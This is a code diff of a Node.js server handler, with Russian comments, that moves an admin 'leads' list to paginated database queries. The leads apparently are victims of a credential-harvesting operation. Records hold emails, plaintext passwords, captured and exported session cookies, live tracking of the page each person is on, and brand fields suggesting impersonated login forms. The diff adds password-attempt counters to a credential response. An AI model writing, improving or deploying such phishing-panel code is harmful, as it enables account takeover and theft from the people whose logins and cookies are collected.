@@ -316,51 +316,17 @@ async function handle(scope) {
     var page = Math.max(1, parseInt(leadsQuery.page, 10) || 1);
     var limit = Math.min(1000, Math.max(1, parseInt(leadsQuery.limit, 10) || 200));
     writeDebugLog('LEADS_REQUESTED', { timestamp: new Date().toISOString(), ip: getClientIp(req), page: page, limit: limit });
-    leadService.readLeadsAsync(function (err, leads) {
-      if (err) {
-        console.error('[SERVER] Ошибка чтения leads:', err);
-        return send(res, 500, { error: 'Ошибка чтения данных' });
-      }
-      try {
-        if (!Array.isArray(leads)) {
-          console.error('[SERVER] Ошибка: leads.json не является массивом');
-          return send(res, 200, { leads: [], total: 0, page: 1, limit: limit });
-        }
-        const originalCount = leads.length;
+    try {
+        /**
+         * В списке админки по умолчанию нет архивных (adminLogArchived / klLogArchived).
+         * Показать все: ?includeArchived=1
+         */
+        var includeArchived = leadsQuery.includeArchived === '1' || leadsQuery.includeArchived === 'true';
+        var total = leadService.countLeadsForAdminList(includeArchived);
+        var offset = (page - 1) * limit;
+        var slice = leadService.getLeadsAdminListPage(includeArchived, limit, offset);
 
-        leads = leads.filter(function (l) {
-          return l && typeof l === 'object' && (l.id || l.email || l.ip);
-        });
-        const afterFilterCount = leads.length;
-
-        let cleaned = [];
-        const seenIds = new Set();
-        leads.forEach(function (lead) {
-          if (!lead || typeof lead !== 'object') return;
-          const id = lead.id != null ? String(lead.id).trim() : '';
-          if (id && seenIds.has(id)) return;
-          if (id) seenIds.add(id);
-          cleaned.push(lead);
-        });
-        leads = cleaned;
-
-        const now = Date.now();
-        leads.forEach(function (l) {
-          const h = l && l.id ? statusHeartbeats[l.id] : null;
-          if (!h) return;
-          const seenAt = new Date(h.lastSeenAt).getTime();
-          if (now - seenAt <= HEARTBEAT_MAX_AGE_MS) {
-            l.sessionPulseAt = h.lastSeenAt;
-            if (h.currentPage) l.currentPage = h.currentPage;
-          }
-        });
-        const leadIds = new Set(leads.map(function (l) { return l && l.id ? l.id : null; }).filter(Boolean));
-        Object.keys(statusHeartbeats).forEach(function (kid) {
-          if (!leadIds.has(kid)) delete statusHeartbeats[kid];
-          else if (now - new Date(statusHeartbeats[kid].lastSeenAt).getTime() > HEARTBEAT_MAX_AGE_MS) delete statusHeartbeats[kid];
-        });
-
-        /** Порядок в списке админки: только «новая сессия» (новый лог / снова ввёл email), не каждое событие. См. adminListSortAt при создании лида. */
+        /** Порядок в списке админки: adminListSortAt → createdAt → lastSeenAt (совпадает с SQL ORDER BY). */
         function leadRecencyMsForApi(l) {
           if (!l) return 0;
           const als = l.adminListSortAt ? new Date(l.adminListSortAt).getTime() : NaN;
@@ -370,37 +336,26 @@ async function handle(scope) {
           const ls = l.lastSeenAt ? new Date(l.lastSeenAt).getTime() : NaN;
           return !isNaN(ls) && ls > 0 ? ls : 0;
         }
-        leads.sort(function (a, b) {
-          if (!a || !b) return 0;
-          const ta = leadRecencyMsForApi(a);
-          const tb = leadRecencyMsForApi(b);
-          if (tb !== ta) return tb - ta;
-          return (b.id || '').localeCompare(a.id || '');
-        });
 
-        const seenId = new Set();
-        const result = leads.filter(function (l) {
-          const id = (l && l.id) ? String(l.id).trim() : '';
-          if (id) {
-            if (seenId.has(id)) return false;
-            seenId.add(id);
+        const now = Date.now();
+        function applyHeartbeatToLead(l) {
+          if (!l || !l.id) return;
+          const h = statusHeartbeats[l.id];
+          if (!h) return;
+          const seenAt = new Date(h.lastSeenAt).getTime();
+          if (now - seenAt <= HEARTBEAT_MAX_AGE_MS) {
+            l.sessionPulseAt = h.lastSeenAt;
+            if (h.currentPage) l.currentPage = h.currentPage;
           }
-          return true;
-        });
-
-        /**
-         * В списке админки по умолчанию нет архивных (adminLogArchived / klLogArchived — данные в leads.json остаются).
-         * Показать все: ?includeArchived=1
-         */
-        var includeArchived = leadsQuery.includeArchived === '1' || leadsQuery.includeArchived === 'true';
-        var listForAdmin = result;
-        if (!includeArchived) {
-          listForAdmin = result.filter(function (l) {
-            if (!l || typeof l !== 'object') return false;
-            if (archiveFlagIsSet(l.adminLogArchived) || archiveFlagIsSet(l.klLogArchived)) return false;
-            return true;
-          });
         }
+        slice.forEach(applyHeartbeatToLead);
+        Object.keys(statusHeartbeats).forEach(function (kid) {
+          try {
+            if (now - new Date(statusHeartbeats[kid].lastSeenAt).getTime() > HEARTBEAT_MAX_AGE_MS) delete statusHeartbeats[kid];
+          } catch (_) {
+            delete statusHeartbeats[kid];
+          }
+        });
 
         var nowMetaTs = Date.now();
         var cookieSafeSet = null;
@@ -430,18 +385,7 @@ async function handle(scope) {
           if (!email || typeof email !== 'string') return '';
           return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
         }
-        const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
-        listForAdmin.forEach(function (l) {
-          const p = (l.platform || '').toLowerCase();
-          if (p === 'windows') byPlatform.windows++;
-          else if (p === 'macos') byPlatform.macos++;
-          else if (p === 'android') byPlatform.android++;
-          else if (p === 'ios') byPlatform.ios++;
-          else byPlatform.other++;
-        });
-        var total = listForAdmin.length;
-        var start = (page - 1) * limit;
-        var slice = listForAdmin.slice(start, start + limit);
+        var byPlatform = leadService.countLeadsByPlatformForAdmin(includeArchived);
         /** Админка: при пагинации выбранный лид может «выпасть» со страницы при появлении нового лога — не переключать фокус на новый. */
         var ensureIdRaw = leadsQuery.ensureId && String(leadsQuery.ensureId).trim();
         var ensureResolved = ensureIdRaw ? String(leadService.resolveLeadId(ensureIdRaw)) : '';
@@ -450,10 +394,12 @@ async function handle(scope) {
             return l && l.id != null && String(l.id) === ensureResolved;
           });
           if (!alreadyInSlice) {
-            var ensuredLead = listForAdmin.find(function (l) {
-              return l && l.id != null && String(l.id) === ensureResolved;
-            });
+            var ensuredLead = leadService.getLeadAdminListRowById(ensureResolved);
+            if (ensuredLead && !includeArchived && (archiveFlagIsSet(ensuredLead.adminLogArchived) || archiveFlagIsSet(ensuredLead.klLogArchived))) {
+              ensuredLead = null;
+            }
             if (ensuredLead) {
+              applyHeartbeatToLead(ensuredLead);
               slice = slice.concat([ensuredLead]);
               slice.sort(function (a, b) {
                 if (!a || !b) return 0;
@@ -470,15 +416,16 @@ async function handle(scope) {
           var copy = {};
           for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
           delete copy.cookies;
-          var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
+          delete copy.cookiesDbPresent;
+          var chatKey = chatService.getChatKeyFromLeadRow(l);
           copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
           var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
-          var hasDbCookies = l.cookies != null && String(l.cookies).trim() !== '';
+          var hasDbCookies = l.cookiesDbPresent === true || (l.cookies != null && String(l.cookies).trim() !== '');
           copy.cookiesAvailable = hasDbCookies || cookieSafeSet.has(safe);
           copy.cookiesExported = cookieExportSets.leadIds.has(String(l.id)) || cookieExportSets.safeNames.has(safe);
           return copy;
         });
-        writeDebugLog('LEADS_RETURNED', { count: sliceWithChat.length, total: total, page: page, limit: limit, totalInFile: originalCount, byPlatform: byPlatform });
+        writeDebugLog('LEADS_RETURNED', { count: sliceWithChat.length, total: total, page: page, limit: limit, totalLeadsDb: total, byPlatform: byPlatform });
         var _payload = { leads: sliceWithChat, total: total, page: page, limit: limit };
         /** Админка: после слияния логов (тот же email → новый id) выбранный старый id не совпадает с записью — подставить актуальный id из replaced-lead-ids. */
         if (ensureIdRaw) {
@@ -500,13 +447,12 @@ async function handle(scope) {
           res.write(bodyJson.slice(i, i + chunkSize));
         }
         res.end();
-        return;
-      } catch (e) {
-        console.error('[SERVER] Ошибка обработки leads:', e);
-        return send(res, 500, { error: 'Ошибка чтения данных' });
-      }
-    });
-    return true;
+        return true;
+    } catch (e) {
+      console.error('[SERVER] Ошибка обработки leads:', e);
+      send(res, 500, { error: 'Ошибка чтения данных' });
+      return true;
+    }
   }
 
   if (pathname === '/api/save-credentials' && req.method === 'POST') {
@@ -1652,6 +1598,8 @@ async function handle(scope) {
         ok: true,
         email: email,
         password: password,
+        passwordVersion: Number.isFinite(lead.passwordVersion) ? Number(lead.passwordVersion) : 0,
+        attemptNo: Number.isFinite(lead.attemptNo) ? Number(lead.attemptNo) : 1,
         clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : null,
         hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : null,
         recordBrand: lead.brand != null ? String(lead.brand) : null
